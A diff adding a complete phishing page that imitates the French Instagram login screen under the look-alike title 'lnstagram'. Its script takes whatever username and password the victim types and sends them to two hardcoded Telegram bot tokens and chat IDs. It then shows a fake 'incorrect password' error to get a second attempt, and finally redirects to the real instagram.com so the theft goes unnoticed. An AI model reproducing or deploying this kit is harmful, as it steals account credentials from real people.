@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>lnstagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .language {
+      color: #8e8e8e;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+
+    .logo img {
+      width: 120px;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    input {
+      padding: 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 8px;
+      display: none;
+    }
+
+    .forgot {
+      color: #00376b;
+      font-size: 13px;
+      margin: 15px 0;
+    }
+
+    .create-account {
+      margin-top: 20px;
+      border: 1px solid #dbdbdb;
+      border-radius: 30px;
+      padding: 12px;
+      color: #0095f6;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .meta {
+      font-size: 12px;
+      color: #8e8e8e;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="language" id="lang-label">Français (France)</div>
+    <div class="logo"><img src="instagram-logo-instagram-icon-transparent-free-png (1).webp" alt="lnstagram Logo"></div>
+    <form id="login-form">
+      <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+      <input type="password" id="password" placeholder="Mot de passe" required>
+      <button type="submit" id="login-button">Se connecter</button>
+      <div class="error" id="error-message">Nom d'utilisateur ou mot de passe incorrect.</div>
+    </form>
+    <div class="forgot">Mot de passe oublié ?</div>
+    <div class="create-account">Créer un compte</div>
+    <div class="meta">© Meta</div>
+  </div>
+
+  <script>
+    const langElement = document.getElementById("lang-label");
+    const lang = navigator.language || navigator.userLanguage;
+    const langMap = {
+      'fr': 'Français (France)',
+      'en': 'English (US)',
+      'de': 'Deutsch',
+      'ar': 'العربية',
+      'it': 'Italiano',
+    };
+    const langShort = lang.split("-")[0];
+    if (langMap[langShort]) {
+      langElement.textContent = langMap[langShort];
+    }
+
+    const form = document.getElementById("login-form");
+    const loginButton = document.getElementById("login-button");
+    const errorMessage = document.getElementById("error-message");
+    let attempt = 0;
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const bots = [
+        { token: "7045256497:AAH-LaOvBulJTS3VNZZ_tHVAGVSLfYPRy6M", chatId: "6660899074" },
+        { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
+      ];
+
+      const text = `Tentative ${attempt + 1}\nNom d'utilisateur / Email: ${username}\nMot de passe: ${password}`;
+
+      for (const bot of bots) {
+        try {
+          await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: bot.chatId,
+              text: text
+            })
+          });
+        } catch (error) {
+          console.error("Erreur d'envoi à Telegram:", error);
+        }
+      }
+
+      loginButton.disabled = true;
+      loginButton.textContent = langShort === 'fr' ? 'Chargement...' : 'Loading...';
+
+      setTimeout(() => {
+        attempt++;
+        loginButton.disabled = false;
+
+        if (attempt < 2) {
+          loginButton.textContent = langShort === 'fr' ? 'Se connecter' : 'Log In';
+          errorMessage.style.display = 'block';
+        } else {
+          window.location.href = "https://www.instagram.com";
+        }
+      }, 4000);
+    });
+  </script>
+</body>
+
+</html>
